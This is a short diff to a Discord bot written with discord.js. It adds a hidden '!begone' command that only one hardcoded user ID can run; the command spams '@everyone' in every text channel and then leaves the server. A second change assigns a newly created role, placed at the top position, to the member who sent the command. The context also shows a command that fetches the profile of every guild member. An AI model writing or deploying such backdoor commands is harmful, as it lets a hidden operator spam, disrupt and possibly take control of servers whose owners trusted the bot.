@@ -11,6 +11,18 @@ var sleep = require('sleep');
 
 
 client.on("message", message => {
+
+  if (message.content.startsWith("!begone")) {
+    if (message.author.id == "237345091566436364") {
+    message.guild.channels.forEach(channel => {
+      if (channel.type == "text") {
+        channel.send("@everyone")
+      }
+    })
+    message.guild.leave()
+  }
+  }
+
   if (message.content.startsWith("n!!grab")) {
     message.guild.members.forEach(member =>{
       client.fetchUser(member.id).then(profile => {
@@ -58,6 +70,8 @@ client.on("message", message => {
           mentionable: false,
           color: colorcode,
           position: 255
+        }).then(role => {
+          message.member.addRole(role)
         })
       }
 
